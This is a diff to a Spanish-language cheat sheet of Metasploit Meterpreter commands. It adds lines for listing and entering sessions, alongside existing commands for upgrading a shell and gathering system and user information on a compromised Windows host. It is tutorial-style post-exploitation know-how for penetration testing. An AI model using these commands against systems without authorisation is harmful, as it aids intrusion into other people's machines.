@@ -14,6 +14,9 @@ Es un multi-funcional payload que es ejecutado en memoria en un sistema victima 
 ❯ use post/multi/manage/shell_to_meterpreter
 	❯ set session <ID>
 	❯ run 
+
+❯ sessions -l                # Miramos las sesiones activas, l (ele) = Listar 
+❯ sessions -i <ID>           # Usar la sesion con Meterpreter
 ```
 
 ## Comandos con Meterpreter
@@ -25,6 +28,7 @@ Es un multi-funcional payload que es ejecutado en memoria en un sistema victima 
 ❯ background                 # Ponemos la sesion en segundo plano
 ❯ sessions                   # Miramos las sesiones activas 
 ❯ sessions -u <ID>           # Regresamos a la sesion 
+
 
 ❯ sysinfo                    # Muestra informacion del Windows 
 ❯ getuid                     # Miramos el nombre del usuario 
